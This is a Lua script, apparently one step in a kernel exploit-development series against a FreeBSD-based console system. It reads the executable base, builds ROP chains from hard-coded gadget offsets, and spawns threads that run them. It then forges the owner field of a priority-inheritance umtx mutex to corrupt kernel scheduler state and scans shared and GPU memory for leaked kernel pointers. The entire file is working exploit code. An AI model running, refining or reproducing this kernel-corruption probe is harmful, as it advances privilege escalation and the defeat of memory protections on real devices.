-- CRASH_CLASS: MODERATE
-- PROBE 160j: PI ownership fraud — diagnostic version
--
-- 160i confirmed: PI ownership fraud (overwrite m_owner + UNLOCK) kills
-- the process after 5-7 rounds. v1 (spinning children) died R5, v2 (exiting
-- children) died R7. More active threads = faster crash = scheduler PI traversal.
--
-- This probe: 3 fraud rounds with extensive diagnostics between each.
-- After fraud rounds, exercise mutex normally to test PI chain integrity.
-- Goal: capture kernel state before crash, find kptrs, understand death mode.

print("=== PROBE 160j: PI FRAUD DIAGNOSTIC ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa = syscall.syscall_address

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret      = 0x42,
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    mov_w    = 0x92C67,
    jmp_loop = 0x15481,
}

local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)

-- Ignore signals
local sc_sigaction = mk(416)
local act_buf = memory.alloc(0x40)
for off = 0, 0x3C, 4 do wd(N(act_buf) + off, 0) end
for sig = 1, 31 do
    if sig ~= 9 then
        wq(N(act_buf), uint64(1)); wd(N(act_buf) + 8, 0)
        pcall(function() sc_sigaction(uint64(sig), act_buf, uint64(0), uint64(0), uint64(0), uint64(0)) end)
    end
end
print("signals ignored")

-- Get main TID
local tid_out_buf = memory.alloc(8)
pcall(function() mk(432)(tid_out_buf) end)
local main_tid = rd(N(tid_out_buf)) or 0
print(string.format("main_tid=0x%X", main_tid))

-- Shared memory
local shared = memory.alloc(0x400)
local MUTEX   = N(shared)
local A_SENT  = N(shared) + 0x10
local A_EXIT  = N(shared) + 0x18

-- Timespec 500ms
local ts_500ms = memory.alloc(16)
wq(N(ts_500ms), uint64(0))
wq(N(ts_500ms) + 8, uint64(500000000))

-- Timespec 100ms (for scheduler exercise)
local ts_100ms = memory.alloc(16)
wq(N(ts_100ms), uint64(0))
wq(N(ts_100ms) + 8, uint64(100000000))

local stk = memory.alloc(0x10000)
local ctx = memory.alloc(0x500)
local tid_buf = memory.alloc(8)

local sc_umtx = mk(454)
local sc_nanosleep = mk(240)

local function cp(base, p, val)
    wq(base + p, val)
    return p + 8
end

local function spawn(chain_base)
    local BC = N(ctx)
    for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
    wd(BC + 0x108, 0x480); wd(BC + 0xD0, 0)
    wd(BC + 0x110, 0x10000)
    wd(BC + 0xC0, 0x43); wd(BC + 0x100, 0x3B)
    wd(BC + 0xE0, rip_lo); wd(BC + 0xE4, rip_hi)
    local rsp_lo = chain_base % 0x100000000
    local rsp_hi = math.floor(chain_base / 0x100000000)
    wd(BC + 0xF8, rsp_lo); wd(BC + 0xFC, rsp_hi)
    wq(N(tid_buf), uint64("0x0"))
    pcall(function() mk(430)(ctx, tid_buf, uint64(0)) end)
    return rq(N(tid_buf))
end

local function zero_shared()
    for off = 0, 0x1F, 4 do wd(N(shared) + off, 0) end
end

local function wait_val(addr, max)
    max = max or 100000
    for i = 1, max do
        local v = rq(addr)
        if v and N(v) ~= 0 then return true end
        if i % 1000 == 0 then native.fcall_with_rax(stub, 20) end
    end
    return false
end

local function wait_dw(addr, max)
    max = max or 200000
    for i = 1, max do
        if (rd(addr) or 0) ~= 0 then return true end
        if i % 1000 == 0 then native.fcall_with_rax(stub, 20) end
    end
    return false
end

-- Scan a region for kernel pointers
local function scan_kptr(addr, len, label)
    local found = 0
    for off = 0, len - 8, 4 do
        local q = rq(addr + off)
        if q then
            local h = 0
            if type(q) == "table" and q.h then h = q.h end
            if h < 0 then h = h + 0x100000000 end
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR %s+0x%X: %s ***", label, off, fmt(q)))
                found = found + 1
            end
        end
    end
    return found
end

-- Diagnostic: test that basic syscalls work
local function diag(tag)
    local p = N(native.fcall_with_rax(stub, 20))
    local a = (p == pid)
    print(string.format("  [diag:%s] alive=%s pid=%d m_owner=0x%X", tag, tostring(a), p, rd(MUTEX) or -1))
    return a
end

-- Build child chain: LOCK → sentinel → nanosleep(500ms) → thr_exit
local function build_lock_exit(base, sent_addr, exit_addr)
    local p = 0
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(454))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", MUTEX)))
    p = cp(base, p, eaddr(G.pop_rsi)); p = cp(base, p, uint64(5))
    p = cp(base, p, sa)
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", sent_addr)))
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64("0xAAAA"))
    p = cp(base, p, eaddr(G.mov_w))
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(240))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", N(ts_500ms))))
    p = cp(base, p, eaddr(G.pop_rsi)); p = cp(base, p, uint64(0))
    p = cp(base, p, sa)
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(431))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", exit_addr)))
    p = cp(base, p, sa)
end

-- ========== CONTROL: normal LOCK/UNLOCK by main (no child) ==========
print("")
print("[0] Control: main LOCKs and UNLOCKs normally")
wd(MUTEX, 0)
local cr1 = nil
pcall(function() cr1 = sc_umtx(uint64(MUTEX), uint64(5), uint64(0), uint64(0), uint64(0)) end)
local cm1 = rd(MUTEX) or 0
local cu1 = nil
pcall(function() cu1 = sc_umtx(uint64(MUTEX), uint64(6), uint64(0), uint64(0), uint64(0)) end)
local cm2 = rd(MUTEX) or 0
print(string.format("  lock_ret=%s m_after_lock=0x%X unlock_ret=%s m_after_unlock=0x%X",
    fmt(cr1), cm1, fmt(cu1), cm2))
diag("post-control")

-- ========== FRAUD ROUNDS ==========
print("")
print("[FRAUD] 3 rounds with diagnostics")

for round = 1, 3 do
    print(string.format("\n  --- Round %d ---", round))
    if not diag("pre") then print("  DEAD before round!"); break end
    zero_shared()

    local CA = N(stk) + 0x2000
    build_lock_exit(CA, A_SENT, A_EXIT)
    local a_tid = spawn(CA)
    print(string.format("  spawned child tid=%s", fmt(a_tid)))

    if not wait_val(A_SENT, 50000) then
        print("  child A timeout")
        wd(MUTEX, 0)
    else
        local a_own = rd(MUTEX) or 0
        print(string.format("  A locked: m_owner=0x%X (child TID)", a_own))

        -- THE FRAUD: overwrite m_owner with main TID
        wd(MUTEX, main_tid)
        local m_fraud = rd(MUTEX) or 0
        print(string.format("  fraud: wrote main_tid=0x%X, read back=0x%X", main_tid, m_fraud))

        -- Main UNLOCKs
        local uret = nil
        local uok = pcall(function()
            uret = sc_umtx(uint64(MUTEX), uint64(6), uint64(0), uint64(0), uint64(0))
        end)
        local m_after = rd(MUTEX) or 0
        print(string.format("  unlock: ok=%s ret=%s m_after=0x%X", tostring(uok), fmt(uret), m_after))

        -- Scan for kernel pointers in shared area
        local kp = scan_kptr(N(shared), 0x100, "shared")
        if kp == 0 then print("  kptr scan: clean") end

        -- Post-fraud diagnostics
        diag("post-unlock")
    end

    -- Wait for child A to exit
    print("  waiting for child exit...")
    local exited = wait_dw(A_EXIT, 200000)
    print(string.format("  child exited=%s", tostring(exited)))

    -- Post-exit diagnostics
    if not diag("post-exit") then print("  DEAD after child exit!"); break end

    -- Scan again after child exit (PI cleanup might leave traces)
    local kp2 = scan_kptr(N(shared), 0x100, "post-exit")
    if kp2 == 0 then print("  post-exit kptr: clean") end

    -- Small sleep to let scheduler exercise PI chains
    pcall(function() sc_nanosleep(ts_100ms, uint64(0)) end)

    if not diag("post-sleep") then print("  DEAD after sleep!"); break end
end

-- ========== POST-FRAUD EXERCISE ==========
print("")
print("[POST] Normal mutex exercise after fraud")

if alive() then
    wd(MUTEX, 0)
    -- Main LOCKs normally
    print("  main LOCK...")
    local pr1 = nil
    local pok1 = pcall(function()
        pr1 = sc_umtx(uint64(MUTEX), uint64(5), uint64(0), uint64(0), uint64(0))
    end)
    local pm1 = rd(MUTEX) or 0
    print(string.format("  lock: ok=%s ret=%s m_owner=0x%X", tostring(pok1), fmt(pr1), pm1))

    -- Main UNLOCKs normally
    print("  main UNLOCK...")
    local pr2 = nil
    local pok2 = pcall(function()
        pr2 = sc_umtx(uint64(MUTEX), uint64(6), uint64(0), uint64(0), uint64(0))
    end)
    local pm2 = rd(MUTEX) or 0
    print(string.format("  unlock: ok=%s ret=%s m_owner=0x%X", tostring(pok2), fmt(pr2), pm2))

    diag("post-exercise")

    -- Spawn a child that LOCKs normally, verify it works
    print("  child normal LOCK test...")
    zero_shared()
    local CC = N(stk) + 0x2000
    build_lock_exit(CC, A_SENT, A_EXIT)
    spawn(CC)
    if wait_val(A_SENT, 50000) then
        local cm = rd(MUTEX) or 0
        print(string.format("  child locked: m_owner=0x%X", cm))
        wait_dw(A_EXIT, 200000)
        wd(MUTEX, 0)
        print("  child exited, mutex cleared")
    else
        print("  child LOCK timeout!")
    end
    diag("final")
else
    print("  DEAD — cannot exercise")
end

-- ========== GPU SCAN ==========
print("")
print("[GPU] Scan GPU pool for leaked kptrs")
if alive() then
    local sc_mmap = mk(477)
    local gpu = nil
    pcall(function()
        gpu = sc_mmap(uint64(0), uint64(16*0x4000), uint64(0x33), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if gpu and N(gpu) ~= 0 then
        local gn = N(gpu)
        if gn < 0 then gn = gn + 0x100000000 end
        local gkp = scan_kptr(gn, 0x1000, "gpu")
        if gkp == 0 then print("  gpu kptr: clean") end
    else
        print("  gpu mmap failed")
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 160j COMPLETE ===")
